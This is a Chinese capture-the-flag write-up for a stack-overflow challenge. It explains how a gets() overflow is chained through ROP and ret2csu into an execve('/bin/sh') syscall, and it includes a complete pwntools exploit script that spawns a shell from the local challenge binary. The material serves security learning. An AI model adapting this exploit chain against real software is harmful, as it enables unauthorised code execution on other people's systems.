# 高端的 syscall

## 题目简述

`main` 中只有 `0x10` 字节栈缓冲区，却使用 `gets()` 读入数据，可覆盖返回地址。程序没有直接后门，但特意提供了设置 `rax` 的函数和 `syscall; ret` 指令片段；结合 ROP 与 ret2csu，可构造 Linux x86-64 的 `execve("/bin/sh", NULL, NULL)` 系统调用。

## 解题过程

x86-64 Linux 中 `execve` 的系统调用号为 59，即 `0x3b`，参数依次放在 `rdi`、`rsi`、`rdx`。利用链分为两步：

1. 调用 `gets(.bss)`，向可写内存写入 `/bin/sh\0`，并在相邻位置写入 `syscall; ret` 的地址；
2. 令 `rax=59`、`rdi=.bss`、`rsi=0`、`rdx=0`，最后通过 CSU 间接调用保存的 syscall 地址。

本题栈溢出偏移为 `0x18`。下面保留题目二进制中的固定 gadget 地址，本地即可验证：

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/ret2syscall")
elf = ELF("../dist/ret2syscall")

pop_rdi = 0x4012E3
csu_pop = 0x4012DA
csu_call = 0x4012C0
set_rax = 0x401196
syscall_ret = 0x4011AE
scratch = 0x404500

payload = flat(
    b"A" * 0x18,
    pop_rdi, scratch,
    elf.plt.gets,
    pop_rdi, 0x3B,
    set_rax,
    csu_pop,
    0, 1, scratch, 0, 0, scratch + 8,
    csu_call,
)

io.sendlineafter(b"Input: \n", payload)
io.sendline(b"/bin/sh\x00" + p64(syscall_ret))
io.interactive()
```

在本题这组 CSU gadget 中，间接调用目标取自 `[r15 + rbx*8]`，所以令 `r15=scratch+8`；`r12d`、`r13`、`r14` 分别被整理到 `edi`、`rsi`、`rdx`，从而得到指向 `/bin/sh` 的第一个参数和两个空参数。CSU 的寄存器布局并非固定模板，实际使用时必须对照目标二进制逐条核验。

## 方法总结

ret2syscall 不依赖 libc 中的 `system`，但必须准确准备系统调用号、参数寄存器、可写字符串和 syscall 指令。ret2csu 的弹栈顺序与间接调用方式随具体二进制确定，不能只背模板；应逐条核对反汇编和调用后的栈平衡。
